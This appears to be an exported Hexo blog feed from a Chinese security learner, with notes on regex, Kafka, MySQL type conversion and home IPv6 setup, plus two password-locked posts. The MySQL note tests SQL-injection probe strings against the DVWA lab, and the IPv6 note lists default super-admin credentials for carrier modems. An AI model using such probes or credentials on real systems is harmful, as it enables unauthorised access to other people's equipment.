<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
<p><code>$</code>匹配行的结束标志</p>
<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
<h3 id="模式匹配"><a class="header-anchor" href="#模式匹配"></a>模式匹配</h3>
<p>留坑待填</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>At the very beginning</title>
    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
    <content><![CDATA[<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
<p>最开始，是看到周围厉害的同学都在写，也就跟风用Hexo和GitHub Page搭了一个博客，显得好像自己也在“厉害的人”的范畴里。后来越来越明白，真正让厉害的人成为厉害的人的，是其学习后输出的东西，而非博客平台本身。所以现在我把博客当做自己的笔记本，让自己的所思所学有一个可以记录的地方，也希望能给别人带来一些帮助。</p>
<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
<p>一个对网络安全初窥门径的人，偶尔会心血来潮想要写写代码。</p>
<p>邮箱：dawnyh@qq.com，欢迎交流 ~</p>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>关于我</tag>
      </tags>
  </entry>
  <entry>
    <title>dark web</title>
    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1/GfmIQmmN1M5s1fHaU6OTDOjcDBBLpOC6S4em62uM3lAjOCwcfk1HIuFjqle0DeyN4GkI0hzu6UctxBG0MsbdiZga5hGjyvHly2DHj/iFIEy7Bys3xdUASB+CPAYEA3+Ru3qKhvIyz8EqyxsmbiLqnDg5wLGr2e7ld3dt3Aux+3TKpLe3ud3vUzT1uUCC1WTPMD1DNoweNxF/MQboM5Ylby/biHO3Vs2WVuFzScmnvUrA9TMm6CZnW9gPvVrcvZWd4JGfLMQdaKN2UbJh5N/Sx21wEscgxFwjHWo0MG6KiBvpxD9z3WUsBeMeKp1nYsjaBbmNT/ZCroIeD3SLdzBMdoJ6pux2HdAcifV0VogbP5xM4pbesgEYzOyzGmMVghQRCiFh7RSkTLpLlY3+a3PG5vQYK8+dgIhyg6cyni3e12v8dbhxf7Jxx04CphbgrhDFsFrRqM0HaztbLx+krsES05isSUa3qPasgcf34CN6+MGUk+tzEfsRciSb1FioBI9O0GgpCKzzyW14IXEDvMHDrWtKjAMRjmOPD52cHyzvwwQCTr71Yy8nnLylCKYadHLIS5iS+yKOta6OTYfIc/EBzolYdgIDQRPydBfln++N3RS+m4kzw0wOxP2vUnbsfabgO2Y4jV1HsXC2/MhphyJ2/n4spL2/sablk7IaMEejxTASOI0xCZFdw8qnTXCNETDBMeh2UPJVK2Q3ltQFDjCSBbwp5oEnyB09eO5lpQLcPsZhJWW5z37/V2+sh6Rdv9Tui19CoigFm0y4P+54uBup3fyTTxOlKsecQ491lxqr0Y3QT13RCUv1kD9DHz6jShhYd6oF9oaJy7iCzPFEoktXue1sHq57L+oNbnB1gytikrJCOzS1QRAiozdZ0AtOQaZG0PFvK107LmuauO/ahWrE2gwoMpPXAkwRtlMjqNGYuVZ1tIutFHXiv+piPAPHCY9ZLeMAXHXftyPylHEJlULAJozOvh0tXToaUjnPF6L3FNKz2SMHc/QVidjAZhKZRgIGTqn+H4PYEcFR/It/Dr/ACZetNDodcs7tg2HnTu450/5yD4DcgS2EW7zYWsXPgutedPlQ4QCYia8j2kH4HUDYJl4UMqHblssTP7J8RkNHEhguH578VL1ERNeBO6xl9bPLkpMc2L6nBW0ZpgiHBF73uJmMiea3wpkzBN3JXyiy5MGvN/6m1XRVoxIjsj0eKKcoEPhMyKWsBZRDwAPKsOY+JC3+ZEfjkf6zptSQEL8xcSVmUN0QykxdpxE4LIPPoscNiB6NCrDPTSM4Iv5rIUkUlvEslsvGbno6WSKnxB+6mNC4NvwuCvuRgu33sargJHyuJO8OzcpTk/AEgcL0rKuGJ8NmRM1dEOKWuGbT06nUG9JHPph/JUnIQPQ5Zgu8MVyJTeqo12RZAAcz5bTwWDu7606E0DM6sOKErqW++EvabpWAYd9C3tWYntVqsryoSQUnWQ/6ZwfosN2nbnRtq6ILXXLzh0TsN/s0TtO/IklZDeFgqL5dgkxL19fqwb+XQsqzdDBaqc83vBMOvgUwRmduPWkV5fCAwbG8cwt+vuvmSAlcIbXinwoVL+gtUk0BcCdMzu3pGiGofsSnETp/8McvWydhtdmDGT/CLb0riR/IyXG7ja7X6oAspLpTgcl0EiITYCEryUra8gbgLkO/sGGgIfOOZ69UT+SncDXHPg7v21YgRjD3XNzWqJwhdLmCnZnbGEIETNMehx/kECa1HlvD9EA+oBg7f6nRk1xAvhvGB2KhAXsgEPCpNp53RatIq1OUklSiLBTuqJtD66kYg7eL0xVpkoiipbQyReAPR80iVVqyfHygi2xvvJAjdSIXDN1BNaqD4jMRmotwqEjbmbwk5+oxZ0TXtwhwu67Uhiv6TRiVHD0kUXe3aaQbBMfCxns16d8vKj0V7mOUp6HxUaxaWlhyaykGaf7RrM4bGYFh8Swd7BLNOl09gNr+h9OwO7qx967nNjvyH0oKuz/x0oBVpJMNy7xh5mr1ZIlbmJph8A67OobEAgE6cmRBHkkYB6AFp1/thPvNvngs3cyKkoIOVFEbtrGhDEHiTB+tpF6ChkjNyVvnu9f/afietCiAZS97CTd6wSRCNKh2zUCNdnmrXtOS39cTtqMadwYD7ivJAObe7645/fPfbDWKMMb1xG/hzPKKZgLCJzokts4566ccDTMdxy5q8futRR9GYoNB+0VtOsFDzSES68p+GgNnSDoKcHDHUh9j8PJY7ePOcS0g9nj5Ta57NBU6BFC+8k/HEBmbvB7L1RwPsgAOLj6twyPY7uT5LujZ09wPjX3a7ppmRZMpqSxpIhJ18oOIHMyKLAK8//xFwdvHu1w+lf7cUh2r1HIe+ARUQgfXhQvyvaFtJgpeJ2+UnBeCaeanw4ZPwD9ZeExtrSxHbr27Je0FPn01xp3hxWsnY6QHk7jO4HWb9/xOs6Nhjw8A0NDGvvZ9GQitaIWGga/td1aoeMBZ2XcCIFg46aCCOK+uWupwyKk8UL2DmlOQwrht2B9vFXenp/q1dx9sD63cON28YF77bKndLdfpzCJ+DsAm8n4r1f2UUVyU4XJmhZ2u174D4DjRcPm3O4mU9dJ71FikVvVUIciIPRYMwLFJqvtr+wSKNwAjeKJalsfxeZE1ScX0DZTa9uclPodjnwHzUMQWaWrOcIG/zTmfRdXXP/4nUMf498eM7jPga6yQVyvIqQY07FFQCACGEasof0AuhEgOdqZSQu/csDBv+th3JUmCGD9nKEtcfdu7b0Br8ZuB9T/n2WJt6Z3V6SMSqUTsM34Cm8Gm8Hd048jUsG9i5H38c0y07VL81aRoIuz16rZohANXPgDqWJgUdS2NyUdKZK5Wa2f20DqOxeSByxdBdBIWc8FKcAj/EUedcZ1ke7FrRkiwvZEl5qeTTslRr0Zecu11Vq2of9XeCIUErY9dV/M/0Rm4HQEowamfLUG5R+818aBU8tV+fooBSxDFH0drY3KVtOliauN7dvP7cMx4phEjqqwSUlhejB3cUVrNXtuF5/HyerOpnGJZiATchbvOgC2o6u7OWjiqox6o0qqGGt3RLb1BgIdlde13AZzfOHwEZNQpKkZTLwFbfE1nBo/AJVlUSrjp7/trRX2DA32sVAjbJnGsNCRrJvD8PqRTRWqQGgV39cXDG8O/rB1RBN4ISw1LiY9PemS/AoGNmE1X4t4n3x/y1en43meZdSYIDAlfAJI+R6lqAuOOo971cWTeEII0xh5EOY3rpv089sf52ob7Qs/oPLM8D/XbIMrva5uO43wcT+XsVPwkJkY7nESMIhLzikaIAhBRJVYB7rlJBnN+7JwgNVJHr/96hiZ9aeWC2s3QaO0MikNhOmr7M3fxSSCZHplkikY0HkAw3aBQq25u2Fhg0Mij9wL41uUZXTxfM7gdHI9gpyGojk4OGmbZZjo+PeQSYfyxpT0tkyjLlm5edatqUTk5wZAKSYBaAev6mblqSV4gEZiItcHbplYEFUm55YGLWuy5K1iJ4e1Cl80S3FnLzb4YPn2SSmYv2rtI0rT8hkHC0nKJksf0t1uIRKoVVnmzZigfJOHG8hFFj7gwZ4YypE3pR9urIOWVxvu3u3vCk7E01fOhm7xirfu/katcwdTxYs8gPO5mg/cNUxWMFGfUpENnvi3jZOdrosNjFq4DXxP1BV9+kRucqZQsHdeGwX0IGepG35xmaqK7ULzAA5v2qw2yJGOiVxLqs7oOCs8DJPkG2WRbXockHrie0JaE8G3zNRVP6KrHe77e/yQHTRxCvssIfEKySK427EEqX2mkNvbSaFaQ652LVUF/2I+BGfw5oBdUsUWa8BN4fFGN9pRmOjBpKwmDnUjc7UFTCF5Z/ksBwIZzcQ9a0uuDsHWFG7UA65k0T1juWs9ah8Wwf1Hjx4V4iqAatTKwicjqzY+6mkWcSnNkunZOCNrUxeO2uCyRA1YwepJYylgDMhSOUaZzdO7R9LuTByUdk6ubh9P8xBDlnkT6IQjb1wufyY+mx6Vl6Q7w4cjvIxXR1Y3Syc2ms/7Lcg+/0DbedjKQn0/Ojq7UB1DOnUklCkLPmmnPbHe8wfNMVWXKvycNXwsNkKHxCgbYrSl8RZC7wd2m/rl4VPuLqXyc/VSUNjoGKaCP8r4JzQjokVABLdMzFw0G1uXsmDdhOA7g8nZUzK6EmjdO3dK733O3yMY5UaAa01RJNS0HJn0MfpFfhcAq9AG9JtPEsHsIVif4qNXFu/pis7OeI66rTU+7Xhwk159ui6Yo6PcghMuh+pWb7q+3hhpWXE2bBJ0Nv4m6ufuLnrRAew7JG3tyqUjOWKwBum6iyn0dW7sQCmdyubDHXSh1dD5bzo+OZA1/9k8pAXyYj9Gu3URn6fYYAxG8inEiAabtvPX8BFwVvrSnHJdWVg03cZviZGc3FR4z5PRkaasgx4YC1whBZPFBsMAKSQqNJXE/F07Az6dWNBSYHz1bUwRJrga69qzwqf+d9OCUI8kRs/Gn8BJt/J1qMW1aLGQE0rfRROpNDLaEd99bvtiA2W9Bkt66LLGQELVcbI/UZsgw47Wtne8NdC2zUFOldCjZ/LgpUZUOFQvwmR9SWLU6xwX25yQVfm7leSRuv9FrxSK80gW1hZfvpnLGR/Kj+O3f772M4abTLTChovKFtqqvIivewbmi96sFQkBdgUGtzOYJ6RjBZ1njBIKX/xpyfR3AHSaXKGRs7oOPfapJ78ajvQVsp1NYKw3utbK2cWdqrsB7+BN/UoDUGkQNh4IO2cXX2eshtOaG66sDWvH6DPHuEUc7+6FKKeosmlNzBRwRHC7wG/I75XDoDd8KurYCAZ15NpffMBHQMIaLIfdhfTW4wj9tWsDxcx0q7QSGdirJQHmbosEEbmw84AeiMuZmkQalFkdaJn2UZOrShEaWgGJCf1evm+LaelqUn3Rju8OEdfitTLSzGWgPEEkm/UQhSBomqkNjh18gwsbLxEcurAFj/ZWSFWGGc5tZ+LXtSaAJ1vQJ7W+G5KrABH8X2ji8jwtWl1PnGG0l/OIXkoalssAGW+NmLc1QV30ZnMt1P5yTcV8fepI+0tBAcFB8fq2NVLAbu1rVYAaeaE5VQoJtOU60dhOBvSTYsanJ2/Njdy60harySYL0GZfYy2YZySiTiUPGJJOF2rafNOhY0jhL/xU6kMMqTkvG9TQDrxKsM2QFXKex5dAnuv/H0RCIi3u+zogVBgNSJ7pElXZ96lczRFhiEHbFDTlTq4n4ag5qZzd+9CW8FahAzJTVaghWA2KeCUftI0GIU37L0iulFnKYwSyTFUxO/LvDHvbAltFeLiSnv9Tjls1j5SB3epXay79YnKDaQ3Tlb+58ZWHdYQYHdJKyuaRGa/SD+DEDlrKM2veeue5bphl3Ck3kOIxT3LYJDMi2INqOZ7xwPVuAdezgeZ51rxxosfqfUp9ndBUvqJj9gM+LhNW4nKK83kMBUR8EOuR2Tv+fYorwoM+EWkY3CcQh66NKuICam2rh9lNAxLZt31LDqIQKNJKixIeeOlSeQEYZ1CBv5krtWWnb+p1FC2Bz9iqWuEDdk4EyO742a0p+vcHlx+hWCv+9pXA5+bgXKZ+ZJ/0RIZQz2TcNUaLbasGrlCSxh3H8257IMB93yvFE9LhnjN5AfxsuuYVvLDNyBxsfRAOjb9KUyPDKZ6lGZ+mc4EpYj3x9oyjIgXgwWmRRCTybtorjRWG91eid+vuAsP+M0ag3Fg9oYmMkzBdUsx7Ts2tFt9U3HCW5FfQbldkmtV+yzq9CidM+B5fMIjTov0otwQGcvczaFuERWqGLGWYLthCuBtl05elr7h8IhJ0UUv7rB3Jw49+usjm85/C9yQKux911eEg1pr2y3BcO8CSZP7S6t7X8v0nil+Vzov8hPl/zyvpdqpg5a4LHqn0eCf3Mj3ZofRDn5nBM9PndYJ1pihcA/pebX1fh9Ih3YSZ0BGxYee6nYcOyqxOTPI9QuphwMfWe/8kGOPYxa0zendr+OPkRoym9rw6/nBeFrDneMAsrp24nIO59H+zbfuV1ZyMMEltyOY3j8jvN6urAHN0mBIPQd6dC90Tqv7hYRLbO8L411EIpp8wzrAGAeL/EhJKPbA7tskOln5OpaUcFWVjVWm2fz5yy5Hqk8ryfoREHtbw0YRaYFmdZmZM4bmksBXe6omFr5aLvX+ZE0iGb5JnhsBz1xOK+x7Rc5IOx6//BFd0n6F13M5p1q6Cv3PTuO5DgVDpJyJ31f4nhnrjvbH4U0601s3zM29CdeTpgnmt+7yqdGDQalVv2UPhUMDKtu9ijgHfN8NE/goQ1sdGDjryy7HuTNl9Z6sbICP3WhkdqKw1bS5KEvdyKOMJ5EuWiEyFSlIypquiSgBd6lDkWncyDORfzrLi5CWbMS6szgYwb0ZZrN+21uYihgcUYb2fCq11nh5oS9G+Tx1OkIDjAz+L5wYszLJvVWmFKq7DajCaeBYF4zIJhdheq/X5Qr7P/vm+0RmPTNmwwfMnMQjhPkIxToRKunCBCU8yPSbqwENU4k/NDLgUeNwj/0ZzYRkpgGI9l4mtid0ppYg4HNfwwdI5nidU7Zb3HnUDFHKBJs3AptQZW05MZ/iVgb6qx/LIDNwABIt81rZXoOTkvfLhv+tQoYUWHk5sfIsFSVD/HG5XJ7dJrvIA+yT/EBowYe1tbPg1iFhJ/4/f7cd2pE9IiohC74QzRZvzXIbqRV1cdZGhkCollYPWhlICP3J3KyDXrR36nZSduaHttqht7GbK1aoSL8yrauBEPpaNlUes4p8hVBPdSTJfwIHHFBg7aJ8ZMrninqmWgvKsrEVsUxS9tlRAo0nm97hBoqygYSspw+v9th98ZKqZRPhK1c2BYR5eLNKe00ZJgVmuQHurwrjlnhp1yPzI6jjjfEIqjWIInsqUjkCXZcBzu3RRf0E2L8gW3EXzfsDB3alFM1+toE1Uenp+QON2dFmiqWn3MrnKe/5Vmw/Uegle9PZQXL4UJue53hENOp2qK5VG1mHB4iQwrgvqDEG+e5qIPR+Y5Edpk0Mn5cVRinSgHnBnYSco81m93XwSSKweEiouxtnG7d59mm0S6XF4vsZQ== </div>]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>暗网</tag>
      </tags>
  </entry>
  <entry>
    <title>kafka笔记</title>
    <url>/2021/07/23/%E5%B7%A5%E5%85%B7/kafka%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="消息队列模型"><a class="header-anchor" href="#消息队列模型"></a>消息队列模型</h2>
<p>队列模型：最早的模型，消息先进先出，一条消息只能被一个消费者使用</p>
<p><strong>发布-订阅模型</strong>：kafka使用的模型</p>
<p><img src="/2021/07/23/%E5%B7%A5%E5%85%B7/kafka%E7%AC%94%E8%AE%B0/image-20210714161917846.png" class="lazy" data-srcset="/2021/07/23/%E5%B7%A5%E5%85%B7/kafka%E7%AC%94%E8%AE%B0/image-20210714161917846.png" srcset="/images/loadingImage.gif" alt="image-20210714161917846"></p>
<h2 id="基本概念"><a class="header-anchor" href="#基本概念"></a>基本概念</h2>
<p><strong>生产者（Producer）</strong>——产生消息的一方</p>
<p><strong>消费者（Consumer）</strong>——处理消息的一方</p>
<p><strong>代理（Broker）</strong>——可以看作是一个独立的 Kafka 实例。多个 Kafka Broker 组成一个 Kafka Cluster（集群）</p>
<p><strong>Topic（主题）</strong> : Producer 将消息发送到特定的主题，Consumer 通过订阅特定的 Topic(主题) 来消费消息。</p>
<p><strong>Partition（分区）</strong> : Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>消息队列</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql的自动类型转换</title>
    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="小特性"><a class="header-anchor" href="#小特性"></a>小特性</h2>
<p>在查询语句的条件判断子句中，如果等号左右两边的类型不同，则会自动进行类型转换。以如下数据表为例</p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084058433.png" class="lazy" data-srcset="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084058433.png" srcset="/images/loadingImage.gif" alt="image-20200722084058433"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082629984.png" class="lazy" data-srcset="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082629984.png" srcset="/images/loadingImage.gif" alt="image-20200722082629984"></p>
<p><code>DVWA</code>的<code>user</code>表👆</p>
<p>在进行以下查询时结果如图：</p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082807883.png" class="lazy" data-srcset="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082807883.png" srcset="/images/loadingImage.gif" alt="image-20200722082807883"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082829117.png" class="lazy" data-srcset="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722082829117.png" srcset="/images/loadingImage.gif" alt="image-20200722082829117"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084904218.png" class="lazy" data-srcset="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084904218.png" srcset="/images/loadingImage.gif" alt="image-20200722084904218"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084727031.png" class="lazy" data-srcset="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722084727031.png" srcset="/images/loadingImage.gif" alt="image-20200722084727031"></p>
<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722083932481.png" class="lazy" data-srcset="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql%E7%9A%84%E8%87%AA%E5%8A%A8%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/image-20200722083932481.png" srcset="/images/loadingImage.gif" alt="image-20200722083932481"></p>
<p>通过上面几个查询的例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
<p>而转换的规则也很有意思。</p>
<p>‘1 and 1=1’ 被当作 1</p>
<p>‘1 and 1=2’ 也被当作1</p>
<p>‘2 and 1=1’ 被当作2</p>
<p>经过更多的测试可以发现</p>
<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞</title>
    <url>/2022/07/13/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19QQy7tQ2vgLFY8VUJNzePcxjpaQRWq8uaKO2nDGs8/GG5jabf/RXxxqccVqVG9kCg2g7JCOOMGG/ysrBugtND8JG4zdRfVwCus0e+0sR29P22sp4h4maLtwdixGiP1OoK5dF9J4Hebxhk0cShhu/ah0peOUoeoKtMwXuE+mbkuL8P5vWvkyS+W1XLr0QQPmvWDqNriAOUqbc7tevRyW30Wex3KufW9oDjGEnXFfaaF+a26e1pKm+BTTG7iFrM22xRfW7gWH3xTWNXmlLuKPhOi7b8OBAF+BlQ+W4tk0y+zfH9KxcWGg0iU93ACwLuRsAcKKWOVq4VCpt3InP/lxaXejnyE1ss/2By4s5M5H/u6zULGgLX9Q86MD5QlwHFwTxqT3CvXiXyfRM2bvXPw0hzWoi+3kwftn8zL4qPPDlg+uf1A54lZ7oqXeJu6fQ1+LMFmwB5IYz9zgGNc4Umn/nRiKuUziic1tluxxJClqeksywhNz8p46ing3z6UJc5wDD5Xkyh807pWUTsdwhJxaq035RTzlivC0QKG2IUTaZhDqXM+6IVidGLw8EQaYBS1Iw8QS94+BGiIC2+TvoRyLmcRQmKoZTCDRVqZuqJfDu79uQQMbIk/kw/x771koHs/LNk8vSS6uXR/NUMYRviPWgTEUc5iLLRfsOqRZRkFb4XXll51Han006vPrJSaRZGrdx0yVEGo0ES63rnb2v3HcdqelciGhqal2ZJfuwM8aXpkIi3+jAI8DFYWX/0Ehh7cgpmPgyjSSIdQSSdaxKbm8sHx6cLckjsu1ymFaXQTFZy14KZ5vr8FPxgeOLyFgQ4hUwjMU33d7WQDrCrlNytTbm2j0aPuu1QDjFDW0NM9gVZ1ZgjYwpLkxjyzS/YbKK8PreHd4h/rt2dBgQASvMKs8bXxaWLnQE2NDuQvw8UPJR1TfNUV58FxiP7dWmwilMwK9IOQUvFI4qI6QYy4K+804ItlxZJFMNWcg2gPydorxe5vm5qKvgaD/LRlXWCbV9gCSQlxaSDYriWdFs5uKlBorjeuMV6deUFHFve+Czdpk+Vc4KgeKsK+lUiGFi2J7zuJhPqri3oqmZu+dp3BFuHnYOCZpfnAz9qc/dFA1LDfpCbA02bggjMJHyGzeka4Cs6XXXbxmwkR2zqgSxhZ0QJw1c/brImIVdPH26iY258XCuQS40b8FLFpprqBRzeUvvfBQR85cbA5siF5qzbuYlrIp54IvwiVc+J1DPxmbEbSMffiNFnp6zqfZDtvhMWOneW3GNh540ZMeCTRLAW2Ik/hT34rZtOcvQEftDBvUOOZi5KnXBL7ujXkmYhkyJ0YJluGA+CnDVveY3XftUIchR2M3ctlQXX9jArYuM6lP3o7+Hi7U2U8iBOyGNRI5O2Xr33vAio+CIklIba6J12+JInOjUAA7MOaemEE2xhVqi/yRjPYfJAhMjm2KzY9xsaiaMWRz1zfmy4gJIefwiLbMhpy3pRSsc4JLsE30xCCyDgwJHvm90D+wkJP3diFs+0Go/RFdwc0zef8+m650+b+NQnUfgDTMNf7ZT4Ru8X4F+LAfiFibKK6NY7ZeeQ3ebp3OlrCnf+JMny6wk+JMg== </div>]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>公网ipv6折腾记录</title>
    <url>/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言"></a>前言</h2>
<p>前段时间突发奇想，想用内网穿透的方式把家里旧电脑上开启的一些服务给暴露在公网上，这样就可以在公司远程访问了。后面查了查资料，发现相比于内网穿透，直接用公网ip去访问更加经济实惠，并且访问速度更快。于是就开始折腾起了公网ip的配置，最后达到的效果如下：</p>
<ol>
<li>开放任意的端口和服务</li>
<li>通过绑定的域名访问主机</li>
<li>动态修改域名解析配置</li>
</ol>
<p>需要注意的是，ipv6通信需要过程中的所有网络设备都支持且启用了ipv6网络，目前常见的光猫、路由器都支持ipv6网络，但大多默认没有开启，所以这俩就是我们主要需要配置的地方。这篇文章把折腾的过程记录一下，供其他感兴趣的朋友参考，如有错误也请大家及时指正。</p>
<h2 id="获取公网ip"><a class="header-anchor" href="#获取公网ip"></a>获取公网ip</h2>
<p>因为公网ipv4资源紧张，现在三大运营商基本是不会给家庭宽带分配独立的公网ipv4地址了，但所幸除了ipv4，我们还有ipv6，毕竟128位的地址空间，完全不用担心不够用。</p>
<p>ipv6的支持目前已经很普及了，但可能是为了避免不必要的麻烦，光猫的默认设置里面一般是没有开启ipv6选项的。所以我们需要先连上宽带（有线或者无线网络都行），再使用超级管理员账号登录光猫的配置页面去打开这个功能。</p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230228215725750.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230228215725750.png" srcset="/images/loadingImage.gif" alt="image-20230228215725750"></p>
<blockquote>
<p>默认配置地址为 <a href="http://192.168.1.1">http://192.168.1.1</a></p>
<p>默认超级管理员账号密码：</p>
<p>移动：CMCCAdmin/aDm8H%MdA</p>
<p>电信：telecomadmin/nE7jA%5m</p>
<p>联通：CUAdmin/CUAdmin</p>
</blockquote>
<p>以移动光猫为例，登录后进入网络-宽带设置页面，选择<code>x_INTERNET_xxx</code>连接进行因特网配置</p>
<p><img src="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230228220842592.png" class="lazy" data-srcset="/2023/02/28/%E6%9D%82%E8%AE%B0/%E5%85%AC%E7%BD%91ipv6%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/image-20230228220842592.png" srcset="/images/loadingImage.gif" alt="image-20230228220842592"></p>
<p>网上查找到的资料大多是使用路由器进行拨号上网，而光猫使用桥接模式，这样配置起来会轻松一些。但由于我这里宽带是房东办的，我不知道密码，所以只能保持光猫拨号，路由器再从光猫这里动态地获取ip地址。所以在这里我只需要打开ipv6地址的自动获取即可，如下图所示：</p>
